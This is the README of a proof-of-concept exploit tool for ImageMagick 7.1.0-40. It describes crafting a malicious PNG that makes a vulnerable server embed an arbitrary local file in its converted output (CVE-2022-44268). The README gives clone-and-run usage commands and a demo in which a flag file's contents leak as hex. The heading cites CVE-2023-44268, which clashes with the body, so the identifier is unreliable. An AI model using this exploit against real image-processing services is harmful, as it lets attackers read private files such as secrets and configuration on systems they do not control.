# CVE-2023-44268 PoC

Create a malicious PNG to take advantage of ImageMagick 7.1.0-40:
- CVE-2022-44267: Denial of Service
- CVE-2022-44268: Information Disclosure

Credit to the researchers who discovered this:
- [Bryan Gonzalez and the Ocelot Team](https://www.metabaseq.com/imagemagick-zero-days/)

## Requirements
- Python3
- PIL (`pip install Pillow`)

## Usage
```shell
git clone https://github.com/agathanon/cve-2023-44268
cd cve-2023-44268
python3 craft.py original.png lol.png /path/to/file
```

**Example shell output against the included flag file**:
```
anon@computer:~/code/cve-2023-44268$ ./craft.py original.png getflag.png $PWD/flag.txt
anon@computer:~/code/cve-2023-44268$ convert getflag.png -resize 100x100 flag.png
anon@computer:~/code/cve-2023-44268$ exiftool -b flag.png
Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers) - flag.png
12.16flag.png.111712023:02:03 13:41:22-05:002023:02:03 13:41:22-05:002023:02:03 13:41:22-05:00644PNGPNGimage/png10063820000.31270.3290.640.330.30.60.150.06255 255 2552023:02:03 18:41:22
txt
      13
4141414142424242434343430a
[minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)2023-02-03T18:39:52+00:002023-02-03T18:39:52+00:00100 630.0063
```

Notice the string AAAABBBBCCCC is hex encoded in the output PNG.
